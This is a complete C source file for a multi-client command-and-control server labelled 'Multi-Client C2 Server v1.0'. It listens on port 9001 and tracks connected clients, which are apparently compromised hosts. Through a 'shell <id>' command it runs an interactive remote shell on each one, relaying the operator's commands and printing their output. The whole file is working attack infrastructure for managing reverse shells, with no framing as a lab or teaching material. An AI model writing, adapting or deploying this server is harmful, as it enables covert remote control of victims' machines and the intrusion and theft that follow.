#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define BUFFER_SIZE 4096
#define MAX_CLIENTS 50
#define PORT 9001

typedef struct {
    int id;
    int socket;
    struct sockaddr_in addr;
    time_t connected_at;
    int active;
    pthread_mutex_t lock;
} Client;

// Global variables
Client clients[MAX_CLIENTS];
int client_count = 0;
int next_client_id = 1;
pthread_mutex_t clients_mutex = PTHREAD_MUTEX_INITIALIZER;
int server_fd;
int server_running = 1;

// Function prototypes
void* listener_thread(void* arg);
void init_clients();
int add_client(int socket, struct sockaddr_in addr);
void remove_client(int id);
void list_clients();
void shell_session(int client_id);
void cleanup_server();
void print_help();

void init_clients() {
    for (int i = 0; i < MAX_CLIENTS; i++) {
        clients[i].id = 0;
        clients[i].socket = -1;
        clients[i].active = 0;
        pthread_mutex_init(&clients[i].lock, NULL);
    }
}

int add_client(int socket, struct sockaddr_in addr) {
    pthread_mutex_lock(&clients_mutex);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (!clients[i].active) {
            clients[i].id = next_client_id++;
            clients[i].socket = socket;
            clients[i].addr = addr;
            clients[i].connected_at = time(NULL);
            clients[i].active = 1;
            client_count++;
            
            int client_id = clients[i].id;
            pthread_mutex_unlock(&clients_mutex);
            
            printf("\n[+] New client connected! ID: %d | IP: %s:%d\n", 
                   client_id,
                   inet_ntoa(addr.sin_addr),
                   ntohs(addr.sin_port));
            printf("C2> ");
            fflush(stdout);
            
            return client_id;
        }
    }
    
    pthread_mutex_unlock(&clients_mutex);
    return -1;
}

void remove_client(int id) {
    pthread_mutex_lock(&clients_mutex);
    
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].active && clients[i].id == id) {
            close(clients[i].socket);
            clients[i].active = 0;
            clients[i].socket = -1;
            client_count--;
            
            printf("\n[-] Client %d disconnected\n", id);
            printf("C2> ");
            fflush(stdout);
            break;
        }
    }
    
    pthread_mutex_unlock(&clients_mutex);
}

void list_clients() {
    pthread_mutex_lock(&clients_mutex);
    
    printf("\n=== Connected Clients ===\n");
    printf("%-5s %-20s %-10s %-20s\n", "ID", "IP Address", "Port", "Connected At");
    printf("--------------------------------------------------------\n");
    
    int found = 0;
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].active) {
            char time_str[20];
            strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", 
                    localtime(&clients[i].connected_at));
            
            printf("%-5d %-20s %-10d %-20s\n",
                   clients[i].id,
                   inet_ntoa(clients[i].addr.sin_addr),
                   ntohs(clients[i].addr.sin_port),
                   time_str);
            found = 1;
        }
    }
    
    if (!found) {
        printf("No clients connected.\n");
    }
    printf("--------------------------------------------------------\n");
    printf("Total clients: %d\n\n", client_count);
    
    pthread_mutex_unlock(&clients_mutex);
}

void shell_session(int client_id) {
    int client_socket = -1;
    int client_index = -1;
    
    // Find the client
    pthread_mutex_lock(&clients_mutex);
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].active && clients[i].id == client_id) {
            client_socket = clients[i].socket;
            client_index = i;
            break;
        }
    }
    pthread_mutex_unlock(&clients_mutex);
    
    if (client_socket == -1) {
        printf("[-] Client %d not found or disconnected\n", client_id);
        return;
    }
    
    printf("[*] Starting shell session with client %d\n", client_id);
    printf("[*] Type 'exit' to return to main menu\n\n");
    
    char buffer[BUFFER_SIZE];
    fd_set read_fds;
    struct timeval timeout;
    
    while (1) {
        printf("shell@client%d> ", client_id);
        fflush(stdout);
        
        // Read command from user
        if (fgets(buffer, BUFFER_SIZE, stdin) == NULL) {
            break;
        }
        
        // Check for exit command
        if (strncmp(buffer, "exit\n", 5) == 0) {
            printf("[*] Exiting shell session\n");
            break;
        }
        
        // Send command to client
        pthread_mutex_lock(&clients[client_index].lock);
        ssize_t sent = send(client_socket, buffer, strlen(buffer), 0);
        
        if (sent <= 0) {
            pthread_mutex_unlock(&clients[client_index].lock);
            printf("[-] Failed to send command. Client may be disconnected.\n");
            remove_client(client_id);
            break;
        }
        
        // Read all available output from client using select with timeout
        while (1) {
            FD_ZERO(&read_fds);
            FD_SET(client_socket, &read_fds);
            
            // Set timeout to 200ms - if no data arrives in this time, assume output is complete
            timeout.tv_sec = 0;
            timeout.tv_usec = 200000;
            
            int ready = select(client_socket + 1, &read_fds, NULL, NULL, &timeout);
            
            if (ready < 0) {
                // Error
                pthread_mutex_unlock(&clients[client_index].lock);
                printf("[-] Select error\n");
                remove_client(client_id);
                return;
            } else if (ready == 0) {
                // Timeout - no more data available
                break;
            }
            
            // Data is available, read it
            memset(buffer, 0, BUFFER_SIZE);
            ssize_t received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
            
            if (received <= 0) {
                pthread_mutex_unlock(&clients[client_index].lock);
                printf("[-] Client disconnected\n");
                remove_client(client_id);
                return;
            }
            
            // Print output immediately
            printf("%s", buffer);
            fflush(stdout);
        }
        
        pthread_mutex_unlock(&clients[client_index].lock);
    }
}

void* listener_thread(void* arg) {
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    
    while (server_running) {
        int client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
        
        if (client_fd < 0) {
            if (server_running) {
                perror("Accept failed");
            }
            continue;
        }
        
        int client_id = add_client(client_fd, client_addr);
        
        if (client_id == -1) {
            printf("\n[-] Maximum clients reached. Connection rejected.\n");
            printf("C2> ");
            fflush(stdout);
            close(client_fd);
        }
    }
    
    return NULL;
}

void print_help() {
    printf("\n=== C2 Server Commands ===\n");
    printf("  list              - List all connected clients\n");
    printf("  shell <id>        - Start interactive shell with client\n");
    printf("  help              - Show this help message\n");
    printf("  quit              - Shutdown server\n");
    printf("==========================\n\n");
}

void cleanup_server() {
    server_running = 0;
    
    printf("\n[*] Shutting down server...\n");
    
    // Close all client connections
    pthread_mutex_lock(&clients_mutex);
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (clients[i].active) {
            close(clients[i].socket);
            clients[i].active = 0;
        }
    }
    pthread_mutex_unlock(&clients_mutex);
    
    // Close server socket
    close(server_fd);
    
    printf("[+] Server shutdown complete\n");
}

int main(int argc, char *argv[]) {
    struct sockaddr_in server_addr;
    pthread_t listener_tid;
    
    printf("=================================\n");
    printf("  Multi-Client C2 Server v1.0\n");
    printf("=================================\n\n");
    
    // Initialize client array
    init_clients();
    
    // Create socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    
    // Set socket options
    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("setsockopt failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }
    
    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);
    
    // Bind socket
    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }
    
    // Listen for connections
    if (listen(server_fd, 10) < 0) {
        perror("Listen failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }
    
    printf("[+] Server listening on port %d\n", PORT);
    printf("[+] Waiting for clients...\n\n");
    
    // Start listener thread
    if (pthread_create(&listener_tid, NULL, listener_thread, NULL) != 0) {
        perror("Failed to create listener thread");
        close(server_fd);
        exit(EXIT_FAILURE);
    }
    
    print_help();
    
    // Main command loop
    char command[256];
    while (1) {
        printf("C2> ");
        fflush(stdout);
        
        if (fgets(command, sizeof(command), stdin) == NULL) {
            break;
        }
        
        // Remove newline
        command[strcspn(command, "\n")] = 0;
        
        if (strlen(command) == 0) {
            continue;
        }
        
        if (strcmp(command, "list") == 0) {
            list_clients();
        }
        else if (strncmp(command, "shell ", 6) == 0) {
            int client_id = atoi(command + 6);
            if (client_id > 0) {
                shell_session(client_id);
            } else {
                printf("[-] Invalid client ID\n");
            }
        }
        else if (strcmp(command, "help") == 0) {
            print_help();
        }
        else if (strcmp(command, "quit") == 0) {
            break;
        }
        else {
            printf("[-] Unknown command: %s\n", command);
            printf("[-] Type 'help' for available commands\n");
        }
    }
    
    cleanup_server();
    pthread_join(listener_tid, NULL);
    
    return 0;
}